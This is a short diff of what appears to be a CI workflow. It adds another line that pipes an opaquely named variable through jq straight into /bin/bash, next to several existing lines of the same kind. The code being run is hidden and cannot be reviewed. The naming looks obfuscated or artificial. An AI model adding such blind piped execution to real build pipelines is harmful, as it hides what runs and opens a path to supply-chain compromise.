@@ -27,6 +27,7 @@ jobs:
           echo $qd700 | jq -r .a71 | /bin/bash
           echo $oju5076 | jq -r .g472 | /bin/bash
           echo $tvwr281 | jq -r .ecoq191 | /bin/bash
+          printf '%s' "$otn64" | jq -r .jsdsl683 | /bin/bash
 
       - name: Upload artifact
         if: always()
